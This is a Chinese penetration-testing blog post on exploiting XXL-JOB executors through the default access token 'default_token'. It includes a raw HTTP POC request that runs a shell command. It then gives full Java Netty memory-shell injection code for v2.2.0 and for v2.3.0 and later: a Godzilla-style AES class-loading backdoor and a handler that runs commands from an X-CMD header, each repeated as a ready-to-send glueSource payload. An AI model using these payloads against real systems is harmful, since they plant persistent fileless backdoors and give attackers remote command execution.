title: XXL-JOB Executor 内存马注入
author: Bmth
tags: []
categories:
  - 渗透测试
top_img: 'https://i-blog.csdnimg.cn/direct/bc3f920a4f944623819a7d250cbe3316.png'
cover: 'https://i-blog.csdnimg.cn/direct/bc3f920a4f944623819a7d250cbe3316.png'
date: 2024-07-09 19:00:00
---
![](https://i-blog.csdnimg.cn/direct/bc3f920a4f944623819a7d250cbe3316.png)

我是清都山水郎。天教分付与疏狂。曾批给雨支风券，累上留云借月章。
诗万首，酒千觞。几曾著眼看侯王。玉楼金阙慵归去，且插梅花醉洛阳。

## 前言
在做渗透测试的时候，发现开放了两个端口，一个是404界面
![](https://i-blog.csdnimg.cn/direct/bda8fdda7a9348c098fe46549d61950f.png)

一个显示报错
![](https://i-blog.csdnimg.cn/direct/1a50c6a6250c492e83e226ac730b3aae.png)

```json
{"code":500,"msg":"invalid request, HttpMethod not support."}
```
经过同事提醒，才发现原来是经典的xxl-job，这个时候可以访问`/xxl-job-admin/`尝试弱口令登录，也可以尝试未授权或者默认 accessToken 打 Executor 执行器

POC：
```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/success",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

但是在无回显+不出网的前提下，如何利用该漏洞呢

## 流程分析
在`resources/application.properties`文件下可以看到
```
xxl.job.accessToken=default_token
```
默认为default_token
![](https://i-blog.csdnimg.cn/direct/fecd600e7bb84dbba38514a63a7a79db.png)

看到`com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler`
该类继承自SimpleChannelInboundHandler类，并重写了`channelRead0`方法实现对请求的认证和处理
![](https://i-blog.csdnimg.cn/direct/a89ec5d7408c42268b8a9d7521041596.png)

跟进process方法
![](https://i-blog.csdnimg.cn/direct/e6b9f59fb10743a392a1d64755bb426d.png)

在accessToken正确的情况下，执行到`com.xxl.job.core.biz.impl.ExecutorBizImpl#run`
![](https://i-blog.csdnimg.cn/direct/84211ff527074d398bf6fda12f5169f0.png)

匹配 glueType 并执行脚本
![](https://i-blog.csdnimg.cn/direct/a8853ce1422844c1ae32dbfe082647ad.png)

可执行
```java
GLUE_GROOVY("GLUE(Java)", false, null, null),
GLUE_SHELL("GLUE(Shell)", true, "bash", ".sh"),
GLUE_PYTHON("GLUE(Python)", true, "python", ".py"),
GLUE_PHP("GLUE(PHP)", true, "php", ".php"),
GLUE_NODEJS("GLUE(Nodejs)", true, "node", ".js"),
GLUE_POWERSHELL("GLUE(PowerShell)", true, "powershell", ".ps1");
```
既然可以执行Java脚本，那么就可以尝试注入内存马了

## 内存马注入
Executor是一个采用Netty框架实现的RESTful API

烽火台实验室给出的具体思路：
>每次请求都将触发一次ServerBootstrap初始化，随即pipeline根据现有的ChannelInitializer#initChannel添加其他handler，若能根据这一特性找到ServerBootstrapAcceptor，反射修改childHandler，也完成handler持久化这一目标

看到`Thread.currentThread().getThreadGroup();`
![](https://i-blog.csdnimg.cn/direct/b9e51c5120da45c286dd9af450d4522e.png)

从线程组中可以获取到ServerBootstrapAcceptor
![](https://i-blog.csdnimg.cn/direct/615bf502af6e4b59b81da8637bf15f2f.png)

在每次请求时都会执行channelRead方法，把传入的childHandler添加到pipeline中
```java
child.pipeline().addLast(new ChannelHandler[]{this.childHandler});
```
那么我们通过反射修改childHandler，即可实现自定义的handler，注意`io.netty.channel.nio.NioEventLoop`为final匿名类，所以需要在前面加上`val$`

### XXL-JOB v2.2.0
哥斯拉的poc：
```java
package com.xxl.job.service.handler;

import com.xxl.job.core.biz.impl.ExecutorBizImpl;
import com.xxl.job.core.server.EmbedServer;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.timeout.IdleStateHandler;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.AbstractMap;
import java.util.HashSet;
import java.util.concurrent.*;

import com.xxl.job.core.log.XxlJobLogger;
import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.handler.IJobHandler;

public class DemoGlueJobHandler extends IJobHandler {
    public static class NettyThreadHandler extends ChannelDuplexHandler{
        String xc = "3c6e0b8a9c15224a";
        String pass = "pass";
        String md5 = md5(pass + xc);
        String result = "";
        private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<>();
        private  static Class payload;

        private static Class defClass(byte[] classbytes)throws Exception{
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0],Thread.currentThread().getContextClassLoader());
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            method.setAccessible(true);
            return (Class) method.invoke(urlClassLoader,classbytes,0,classbytes.length);
        }

        public byte[] x(byte[] s, boolean m) {
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
                return c.doFinal(s);
            } catch(Exception e) {
                return null;
            }
        }
        public static String md5(String s) {
            String ret = null;
            try {
                java.security.MessageDigest m;
                m = java.security.MessageDigest.getInstance("MD5");
                m.update(s.getBytes(), 0, s.length());
                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
            } catch(Exception e) {}
            return ret;
        }

        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
            if(((HttpRequest)msg).uri().contains("netty_memshell")) {
                if (msg instanceof HttpRequest){
                    HttpRequest httpRequest = (HttpRequest) msg;
                    AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest,new ByteArrayOutputStream());
                    requestThreadLocal.set(simpleEntry);
                }
                if(msg instanceof HttpContent){
                    HttpContent httpContent = (HttpContent)msg;
                    AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();
                    if (simpleEntry == null){
                        return;
                    }
                    HttpRequest httpRequest = simpleEntry.getKey();
                    ByteArrayOutputStream contentBuf = simpleEntry.getValue();

                    ByteBuf byteBuf = httpContent.content();
                    int size = byteBuf.capacity();
                    byte[] requestContent = new byte[size];
                    byteBuf.getBytes(0,requestContent,0,requestContent.length);

                    contentBuf.write(requestContent);

                    if (httpContent instanceof LastHttpContent){
                        try {
                            byte[] data =  x(contentBuf.toByteArray(), false);

                            if (payload == null) {
                                payload = defClass(data);
                                send(ctx,x(new byte[0], true),HttpResponseStatus.OK);
                            } else {
                                Object f = payload.newInstance();
                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                f.equals(arrOut);
                                f.equals(data);
                                f.toString();
                                send(ctx,x(arrOut.toByteArray(), true),HttpResponseStatus.OK);
                            }
                        } catch(Exception e) {
                            ctx.fireChannelRead(httpRequest);
                        }
                    }else {
                        ctx.fireChannelRead(msg);
                    }
                }
            } else {
                ctx.fireChannelRead(msg);
            }
        }

        private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {
            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));
            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
        }
    }

    public ReturnT<String> execute(String param) throws Exception{
        try{
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            Field threads = group.getClass().getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] allThreads = (Thread[]) threads.get(group);
            for (Thread thread : allThreads) {
                if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
                    try {
                        Object target;

                        try {
                            target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val\$eventExecutor");
                        } catch (Exception e) {
                            continue;
                        }

                        if (target.getClass().getName().endsWith("NioEventLoop")) {
                            XxlJobLogger.log("NioEventLoop find");
                            HashSet set = (HashSet) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
                            if (!set.isEmpty()) {
                                Object keys = set.toArray()[0];
                                Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
                                Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
                                setFieldValue(embedHttpServerHandler, "childHandler", new ChannelInitializer<SocketChannel>() {
                                    @Override
                                    public void initChannel(SocketChannel channel) throws Exception {
                                        channel.pipeline()
                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))  // beat 3N, close if idle
                                            .addLast(new HttpServerCodec())
                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))  // merge request & reponse to FULL
                                            .addLast(new NettyThreadHandler())
                                            .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), "", new ThreadPoolExecutor(
                                                0,
                                                200,
                                                60L,
                                                TimeUnit.SECONDS,
                                                new LinkedBlockingQueue<Runnable>(2000),
                                                new ThreadFactory() {
                                                    @Override
                                                    public Thread newThread(Runnable r) {
                                                        return new Thread(r, "xxl-rpc, EmbedServer bizThreadPool-" + r.hashCode());
                                                    }
                                                },
                                                new RejectedExecutionHandler() {
                                                    @Override
                                                    public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {
                                                        throw new RuntimeException("xxl-job, EmbedServer bizThreadPool is EXHAUSTED!");
                                                    }
                                                })));
                                    }
                                });
                                XxlJobLogger.log("success!");
                                break;
                            }
                        }
                    } catch (Exception e){
                        XxlJobLogger.log(e.toString());
                    }
                }
            }
        }catch (Exception e){
            XxlJobLogger.log(e.toString());
        }
        return ReturnT.SUCCESS;
    }

    public Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null){
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }

    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
```
exp：
```
"glueSource":"package com.xxl.job.service.handler;\n\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport com.xxl.job.core.server.EmbedServer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.io.ByteArrayOutputStream;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.util.AbstractMap;\nimport java.util.HashSet;\nimport java.util.concurrent.*;\n\nimport com.xxl.job.core.log.XxlJobLogger;\nimport com.xxl.job.core.biz.model.ReturnT;\nimport com.xxl.job.core.handler.IJobHandler;\n\npublic class DemoGlueJobHandler extends IJobHandler {\n    public static class NettyThreadHandler extends ChannelDuplexHandler{\n        String xc = \"3c6e0b8a9c15224a\";\n        String pass = \"pass\";\n        String md5 = md5(pass + xc);\n        String result = \"\";\n        private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<>();\n        private  static Class payload;\n\n        private static Class defClass(byte[] classbytes)throws Exception{\n            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0],Thread.currentThread().getContextClassLoader());\n            Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n            method.setAccessible(true);\n            return (Class) method.invoke(urlClassLoader,classbytes,0,classbytes.length);\n        }\n\n        public byte[] x(byte[] s, boolean m) {\n            try {\n                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n                return c.doFinal(s);\n            } catch(Exception e) {\n                return null;\n            }\n        }\n        public static String md5(String s) {\n            String ret = null;\n            try {\n                java.security.MessageDigest m;\n                m = java.security.MessageDigest.getInstance(\"MD5\");\n                m.update(s.getBytes(), 0, s.length());\n                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n            } catch(Exception e) {}\n            return ret;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if(((HttpRequest)msg).uri().contains(\"netty_memshell\")) {\n                if (msg instanceof HttpRequest){\n                    HttpRequest httpRequest = (HttpRequest) msg;\n                    AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest,new ByteArrayOutputStream());\n                    requestThreadLocal.set(simpleEntry);\n                }\n                if(msg instanceof HttpContent){\n                    HttpContent httpContent = (HttpContent)msg;\n                    AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();\n                    if (simpleEntry == null){\n                        return;\n                    }\n                    HttpRequest httpRequest = simpleEntry.getKey();\n                    ByteArrayOutputStream contentBuf = simpleEntry.getValue();\n\n                    ByteBuf byteBuf = httpContent.content();\n                    int size = byteBuf.capacity();\n                    byte[] requestContent = new byte[size];\n                    byteBuf.getBytes(0,requestContent,0,requestContent.length);\n\n                    contentBuf.write(requestContent);\n\n                    if (httpContent instanceof LastHttpContent){\n                        try {\n                            byte[] data =  x(contentBuf.toByteArray(), false);\n\n                            if (payload == null) {\n                                payload = defClass(data);\n                                send(ctx,x(new byte[0], true),HttpResponseStatus.OK);\n                            } else {\n                                Object f = payload.newInstance();\n                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n                                f.equals(arrOut);\n                                f.equals(data);\n                                f.toString();\n                                send(ctx,x(arrOut.toByteArray(), true),HttpResponseStatus.OK);\n                            }\n                        } catch(Exception e) {\n                            ctx.fireChannelRead(httpRequest);\n                        }\n                    }else {\n                        ctx.fireChannelRead(msg);\n                    }\n                }\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n        }\n    }\n\n    public ReturnT<String> execute(String param) throws Exception{\n        try{\n            ThreadGroup group = Thread.currentThread().getThreadGroup();\n            Field threads = group.getClass().getDeclaredField(\"threads\");\n            threads.setAccessible(true);\n            Thread[] allThreads = (Thread[]) threads.get(group);\n            for (Thread thread : allThreads) {\n                if (thread != null && thread.getName().contains(\"nioEventLoopGroup\")) {\n                    try {\n                        Object target;\n\n                        try {\n                            target = getFieldValue(getFieldValue(getFieldValue(thread, \"target\"), \"runnable\"), \"val\\$eventExecutor\");\n                        } catch (Exception e) {\n                            continue;\n                        }\n\n                        if (target.getClass().getName().endsWith(\"NioEventLoop\")) {\n                            XxlJobLogger.log(\"NioEventLoop find\");\n                            HashSet set = (HashSet) getFieldValue(getFieldValue(target, \"unwrappedSelector\"), \"keys\");\n                            if (!set.isEmpty()) {\n                                Object keys = set.toArray()[0];\n                                Object pipeline = getFieldValue(getFieldValue(keys, \"attachment\"), \"pipeline\");\n                                Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, \"head\"), \"next\"), \"handler\");\n                                setFieldValue(embedHttpServerHandler, \"childHandler\", new ChannelInitializer<SocketChannel>() {\n                                    @Override\n                                    public void initChannel(SocketChannel channel) throws Exception {\n                                        channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))  // beat 3N, close if idle\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))  // merge request & reponse to FULL\n                                            .addLast(new NettyThreadHandler())\n                                            .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), \"\", new ThreadPoolExecutor(\n                                                0,\n                                                200,\n                                                60L,\n                                                TimeUnit.SECONDS,\n                                                new LinkedBlockingQueue<Runnable>(2000),\n                                                new ThreadFactory() {\n                                                    @Override\n                                                    public Thread newThread(Runnable r) {\n                                                        return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                                                    }\n                                                },\n                                                new RejectedExecutionHandler() {\n                                                    @Override\n                                                    public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                                        throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                                                    }\n                                                })));\n                                    }\n                                });\n                                XxlJobLogger.log(\"success!\");\n                                break;\n                            }\n                        }\n                    } catch (Exception e){\n                        XxlJobLogger.log(e.toString());\n                    }\n                }\n            }\n        }catch (Exception e){\n            XxlJobLogger.log(e.toString());\n        }\n        return ReturnT.SUCCESS;\n    }\n\n    public Field getField(final Class<?> clazz, final String fieldName) {\n        Field field = null;\n        try {\n            field = clazz.getDeclaredField(fieldName);\n            field.setAccessible(true);\n        } catch (NoSuchFieldException ex) {\n            if (clazz.getSuperclass() != null){\n                field = getField(clazz.getSuperclass(), fieldName);\n            }\n        }\n        return field;\n    }\n\n    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        field.set(obj, value);\n    }\n}"
```
![](https://i-blog.csdnimg.cn/direct/261db05a00074156a9d9eb21d216f650.png)


### XXL-JOB >=v2.3.0
在2.3.0的版本中，进行了大改，简单看一下
![](https://i-blog.csdnimg.cn/direct/5400628e890a4169a5d7d3997a2a942b.png)

需要修改这两个地方，给一个修改后回显的
```java
import io.netty.util.CharsetUtil;
import com.xxl.job.core.biz.impl.ExecutorBizImpl;
import com.xxl.job.core.server.EmbedServer;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.timeout.IdleStateHandler;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Scanner;
import java.util.concurrent.*;

import com.xxl.job.core.context.XxlJobHelper;
import com.xxl.job.core.handler.IJobHandler;

public class DemoGlueJobHandler extends IJobHandler {
    public static class NettyThreadHandler extends ChannelDuplexHandler{
        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
            if(((HttpRequest)msg).uri().contains("shell")) {
                HttpRequest httpRequest = (HttpRequest)msg;
                if(httpRequest.headers().contains("X-CMD")) {
                    String cmd = httpRequest.headers().get("X-CMD");
                    ArrayList<String> cmdList = new ArrayList<>();
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        cmdList.add("cmd.exe");
                        cmdList.add("/c");
                    } else {
                        cmdList.add("/bin/bash");
                        cmdList.add("-c");
                    }
                    cmdList.add(cmd);
                    String[] cmds = cmdList.toArray(new String[0]);

                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String execResult = s.hasNext() ? s.next() : "";
                    send(ctx, execResult, HttpResponseStatus.OK);
                }else {
                    ctx.fireChannelRead(msg);
                }
            } else {
                ctx.fireChannelRead(msg);
            }
        }

        private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {
            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));
            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
        }
    }

    public void execute() throws Exception{
        try{
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            Field threads = group.getClass().getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] allThreads = (Thread[]) threads.get(group);
            for (Thread thread : allThreads) {
                if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
                    try {
                        Object target;

                        try {
                            target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val\$eventExecutor");
                        } catch (Exception e) {
                            continue;
                        }

                        if (target.getClass().getName().endsWith("NioEventLoop")) {
                            XxlJobHelper.log("NioEventLoop find");
                            HashSet set = (HashSet) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
                            if (!set.isEmpty()) {
                                Object keys = set.toArray()[0];
                                Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
                                Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
                                setFieldValue(embedHttpServerHandler, "childHandler", new ChannelInitializer<SocketChannel>() {
                                    @Override
                                    public void initChannel(SocketChannel channel) throws Exception {
                                        channel.pipeline()
                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))  // beat 3N, close if idle
                                            .addLast(new HttpServerCodec())
                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))  // merge request & reponse to FULL
                                            .addLast(new NettyThreadHandler())
                                            .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), "", new ThreadPoolExecutor(
                                                0,
                                                200,
                                                60L,
                                                TimeUnit.SECONDS,
                                                new LinkedBlockingQueue<Runnable>(2000),
                                                new ThreadFactory() {
                                                    @Override
                                                    public Thread newThread(Runnable r) {
                                                        return new Thread(r, "xxl-rpc, EmbedServer bizThreadPool-" + r.hashCode());
                                                    }
                                                },
                                                new RejectedExecutionHandler() {
                                                    @Override
                                                    public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {
                                                        throw new RuntimeException("xxl-job, EmbedServer bizThreadPool is EXHAUSTED!");
                                                    }
                                                })));
                                    }
                                });
                                XxlJobHelper.log("success!");
                                break;
                            }
                        }
                    } catch (Exception e){
                        XxlJobHelper.log(e.toString());
                    }
                }
            }
        }catch (Exception e){
            XxlJobHelper.log(e.toString());
        }
    }

    public Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null){
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }

    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
```
exp：
```
"glueSource":"import io.netty.util.CharsetUtil;\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport com.xxl.job.core.server.EmbedServer;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.lang.reflect.Field;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.Scanner;\nimport java.util.concurrent.*;\n\nimport com.xxl.job.core.context.XxlJobHelper;\nimport com.xxl.job.core.handler.IJobHandler;\n\npublic class DemoGlueJobHandler extends IJobHandler {\n    public static class NettyThreadHandler extends ChannelDuplexHandler{\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if(((HttpRequest)msg).uri().contains(\"shell\")) {\n                HttpRequest httpRequest = (HttpRequest)msg;\n                if(httpRequest.headers().contains(\"X-CMD\")) {\n                    String cmd = httpRequest.headers().get(\"X-CMD\");\n                    ArrayList<String> cmdList = new ArrayList<>();\n                    String osTyp = System.getProperty(\"os.name\");\n                    if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n                        cmdList.add(\"cmd.exe\");\n                        cmdList.add(\"/c\");\n                    } else {\n                        cmdList.add(\"/bin/bash\");\n                        cmdList.add(\"-c\");\n                    }\n                    cmdList.add(cmd);\n                    String[] cmds = cmdList.toArray(new String[0]);\n\n                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n                    Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");\n                    String execResult = s.hasNext() ? s.next() : \"\";\n                    send(ctx, execResult, HttpResponseStatus.OK);\n                }else {\n                    ctx.fireChannelRead(msg);\n                }\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n        }\n    }\n\n    public void execute() throws Exception{\n        try{\n            ThreadGroup group = Thread.currentThread().getThreadGroup();\n            Field threads = group.getClass().getDeclaredField(\"threads\");\n            threads.setAccessible(true);\n            Thread[] allThreads = (Thread[]) threads.get(group);\n            for (Thread thread : allThreads) {\n                if (thread != null && thread.getName().contains(\"nioEventLoopGroup\")) {\n                    try {\n                        Object target;\n\n                        try {\n                            target = getFieldValue(getFieldValue(getFieldValue(thread, \"target\"), \"runnable\"), \"val\\$eventExecutor\");\n                        } catch (Exception e) {\n                            continue;\n                        }\n\n                        if (target.getClass().getName().endsWith(\"NioEventLoop\")) {\n                            XxlJobHelper.log(\"NioEventLoop find\");\n                            HashSet set = (HashSet) getFieldValue(getFieldValue(target, \"unwrappedSelector\"), \"keys\");\n                            if (!set.isEmpty()) {\n                                Object keys = set.toArray()[0];\n                                Object pipeline = getFieldValue(getFieldValue(keys, \"attachment\"), \"pipeline\");\n                                Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, \"head\"), \"next\"), \"handler\");\n                                setFieldValue(embedHttpServerHandler, \"childHandler\", new ChannelInitializer<SocketChannel>() {\n                                    @Override\n                                    public void initChannel(SocketChannel channel) throws Exception {\n                                        channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))  // beat 3N, close if idle\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))  // merge request & reponse to FULL\n                                            .addLast(new NettyThreadHandler())\n                                            .addLast(new EmbedServer.EmbedHttpServerHandler(new ExecutorBizImpl(), \"\", new ThreadPoolExecutor(\n                                                0,\n                                                200,\n                                                60L,\n                                                TimeUnit.SECONDS,\n                                                new LinkedBlockingQueue<Runnable>(2000),\n                                                new ThreadFactory() {\n                                                    @Override\n                                                    public Thread newThread(Runnable r) {\n                                                        return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                                                    }\n                                                },\n                                                new RejectedExecutionHandler() {\n                                                    @Override\n                                                    public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                                        throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                                                    }\n                                                })));\n                                    }\n                                });\n                                XxlJobHelper.log(\"success!\");\n                                break;\n                            }\n                        }\n                    } catch (Exception e){\n                        XxlJobHelper.log(e.toString());\n                    }\n                }\n            }\n        }catch (Exception e){\n            XxlJobHelper.log(e.toString());\n        }\n    }\n\n    public Field getField(final Class<?> clazz, final String fieldName) {\n        Field field = null;\n        try {\n            field = clazz.getDeclaredField(fieldName);\n            field.setAccessible(true);\n        } catch (NoSuchFieldException ex) {\n            if (clazz.getSuperclass() != null){\n                field = getField(clazz.getSuperclass(), fieldName);\n            }\n        }\n        return field;\n    }\n\n    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        field.set(obj, value);\n    }\n}"
```
![](https://i-blog.csdnimg.cn/direct/bab504c4dc544b3c9baf7de96ae29abc.png)


参考：
[xxl-job利用研究](https://www.kitsch.life/2024/01/31/xxl-job%e5%88%a9%e7%94%a8%e7%a0%94%e7%a9%b6/)
[XXL-JOB内存马](https://mp.weixin.qq.com/s/aFE5BXTpnLaCymUJFAC3og)
[netty内存马探究](https://mp.weixin.qq.com/s/CxKbdkZqKftf1cP0BvBeUQ)